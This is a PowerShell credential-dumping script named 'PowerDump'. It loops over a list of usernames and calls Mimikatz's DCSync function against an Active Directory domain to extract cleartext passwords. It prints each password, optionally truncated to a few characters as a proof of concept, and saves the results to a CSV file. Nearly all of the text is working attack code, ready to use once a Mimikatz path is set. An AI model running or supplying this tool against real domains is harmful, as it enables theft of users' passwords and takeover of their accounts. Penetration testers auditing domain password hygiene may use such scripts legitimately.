<#
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░PowerDump ░░░░░██▓░░░░░░░░░░░░░░░░░░░░░
░----------░░░░░▓███▒░░░░░░░░░░░░░░░░░░░
░ Find all ░░░░░▓█████░░░Sh*tty coding:░
░The stupid░░░░░███████░░░░@KillianS░░░░
░   SH*T   ░░░░▓████████░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░██████████░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░▒██████████▓░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░███████████░░░░░░░░░░░░░░
░░░░░░░░░░░░░░▓███████████░░░░░░░░░░░░░░
░░░░░░░░░░░░▒█████████████░░░░░░░░░░░░░░
░░░░░░░░░░░▒██████████████▓▒░░░░░░░░░░░░
░░░░░░░░░░░██████████████████░░░░░░░░░░░
░░░░░░░░░░▒███████████████████░░░░░░░░░░
░░░░░░░░░░▓███████████████████▒░░░░░░░░░
░░░░░░░░░░▓███▓▓█████████▓▓███▒░░░░░░░░░
░░░░░░░░░░░██░░░░███████▒░░░▓█░░░░░░░░░░
░░░░░░░░░▓██░░██░░█████▒░██▓░██▒░░░░░░░░
░░░░░░░░███▓░████░▓████░▓███░▒███░░░░░░░
░░░░░░░▓███▒░████░▓████░████▒░███▒░░░░░░
░░░░░░░████▒░████░▓████░████░░████░░░░░░
░░░░░░░████▓░████░█████░▒███░░████░░░░░░
░░░░░░░█████░░██░░█████▒░██░░█████░░░░░░
░░░░░░░██████░░░░▓██████░░░░▒█████░░░░░░
░░░░░░░███████▒▒█████████▓▒██████▓░░░░░░
░░░░░▓█████████████████████████████▓░░░░
░░░░█████████████████████████████████░░░
░░░▒███████████░░░▒▒▒▒▒░░░▓██████████▒░░
░░░████████████▓░░░░░░░░░▓████████████░░
░░░██████████████▒░░░░░▒██████████████░░
░░░███████████████████████████████████░░
░░░██████████████████████████████████▒░░
░░░▒█████████████████████████████████░░░
░░░░▓██████████████████████████████▒░░░░
░░░░░░▓███▒░░░░░░▒▓▓███████████▓▒░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░

Requirements:
- Mimikatz - the location will need to be set in the script
- Run with an account that has "Replicating Directory Changes" permissions
- List of accounts to test
#>

#####
# Settings
    #Text file with usernames (one per line)
    $UsernameFile = ".\users.txt"
    #File to save credentials to
    $ExportPath = "userPassword.csv"
    #prefix for account (prefix\Username)
    $prefix = "domain"
    #Fully Qualified Domain Name that you would like to scan against
    $FQDN = "domain.local"

    #Show password as the script is run - set to $true to show
    $displayCurrentPassword = $true

    #POC USE - Only show the first x characters of the password - set to $true to show
    $hideFullPassword = $true
    $CharactersToShow = 5
#
#####

#Clear Results Array
$results = @()
#Get list of usernames to check
$allaccounts = Get-Content $UsernameFile
#start loop
Foreach($user in $allaccounts){
    $Username=$prefix+"\"+$user
    Write-Host "[-] Dumping password for $Username" -ForegroundColor Yellow
    
    ###change this to the install of your mimikatz executable##
    $current = $(C:\pathToMimikatz\mimikatz.exe /run "lsadump::dcsync /domain:$FQDN /user:$Username" exit  | Select-String Primary:CLEARTEXT -Context 1).ToString()
    ##### CHANGE ABOVE #####

    #Parse current password from output
    $password = $current.Split("`n")
    $password = $($password[$password.Length-1]).substring(6)
    #snip password if enabled
    if($hideFullPassword -eq $true){
        $password = $password.Substring(0,$CharactersToShow)
    }
    #save results
    $results = [pscustomobject]@{
        Username = $Username
        Password = $password
    }
    #show current password if enabled
    if($displayCurrentPassword -eq $true){ Write-Host "  User: $Username | Password: $password" }
    #add results to the CSV File
    $results | Export-Csv $ExportPath -NoTypeInformation -Append
    Write-Host "    [+] DONE!" -ForegroundColor Green
}
Write-Host "[!] Finished! File saved to $ExportPath" -ForegroundColor Cyan